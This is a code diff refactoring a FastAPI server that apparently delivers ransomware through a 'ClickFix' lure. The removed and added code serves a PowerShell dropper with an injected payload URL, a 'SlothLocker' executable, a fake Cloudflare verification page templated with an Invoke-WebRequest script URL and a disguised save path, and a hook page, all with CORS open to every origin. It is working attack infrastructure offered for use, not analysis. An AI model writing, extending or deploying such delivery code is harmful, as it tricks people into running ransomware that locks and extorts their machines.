@@ -1,85 +1,27 @@
-from fastapi import FastAPI,Request
-from fastapi.responses import FileResponse,HTMLResponse,Response
-from do import DoShit
-import asyncio
-import aiofiles
 import config
-from fastapi.middleware.cors import CORSMiddleware
-import os
-import colorama
+import utils
+import fastapi
 
 
 
+app = fastapi.FastAPI()
 
-app = FastAPI()
+@app.get(config.dropperEndpoint)
+async def servePowerShellDropperFile(req:fastapi.Request):return await utils.servePowerShellDropperFile(req)
 
-app.add_middleware(CORSMiddleware,
-    allow_origins=["*"],
-    allow_credentials=True,
-    allow_methods=["*"],
-    allow_headers=["*"],
-)
+@app.get(config.binEndpoint)
+async def serveFinalSlothLockerDotEXE(req:fastapi.Request):return await utils.serveFinalSlothLockerDotEXE(req)
 
+@app.get(config.mainInterfaceEndpoint)
+async def mainInterface(req:fastapi.Request):return await utils.mainInterface(req)
 
-
-
-@app.get(f"{config.dropperEndpoint}")
-def malserve():
-    with open(config.conf["PATHS"]["dropper"],"r",encoding="utf-8") as powershellscript:
-        PSCode = powershellscript.read()
-    PSCode = PSCode.replace("{{Binary Payload URL}}",config.conf["URLS"]["actual_binary_payload"])
-    return Response(
-        content=PSCode,
-        media_type="text/plain"
-    )
+@app.get(config.hookPageEndpoint)
+async def releiveUser(req:fastapi.Request):return await utils.serveSecondHTML(req)
 
 
 
-@app.get(f"{config.binEndpoint}")
-def serveBin():
-    return FileResponse(
-        config.conf["PATHS"]["binary_payload"]
-    )
+utils.addMiddleWares(app,allowAll=True)
+utils.ServerStartUp(__file__, __name__)
 
 
 
-
-
-
-
-@app.get("/")
-async def root_route(req:Request):
-    await DoShit(req).start("now")
-
-    async with aiofiles.open(config.conf["PATHS"]["cloudflare_page"],encoding="utf-8") as f:
-        html = await f.read()
-    templates = {
-        "{{PSScript URL for IWR}}":config.conf["URLS"]["powershell_dropper_url"],
-        "{{CLICK_FIX_PAGE}}":config.conf["URLS"]["clickfix_page_endpoint"],
-        "{{Payload Save Path In UserDisk}}":"C:\\\\MicrosoftSmartBoot",
-        "{{Fav-Icon-URL-Placeholder}}":config.conf["URLS"]["favicon_url"],
-    }
-    for template,replacement in templates.items():
-        html = html.replace(template,replacement)
-    if os.environ.get("VERBOSE_DEBUG",None):print(html)
-    return HTMLResponse(
-      html  
-    )
-
-@app.get(f"{config.hookPageEndpoint}")
-async def repair(req:Request):
-    await DoShit(req).start("now")
-    async with aiofiles.open(config.conf["PATHS"]["clickfix_page"],"r") as CFX:
-        CFXHtml = await CFX.read()
-    return Response(
-        content=CFXHtml,
-        media_type="text/plain"
-    )
-
-
-
-if __name__=="__main__":
-    colorama.init()
-    os.system(
-        f"uvicorn {config.ServerFile.replace('.py','')}:app --port {config.DeployedPort} --host 0.0.0.0{"" if config.isDeployed else ' --reload'}"
-    )
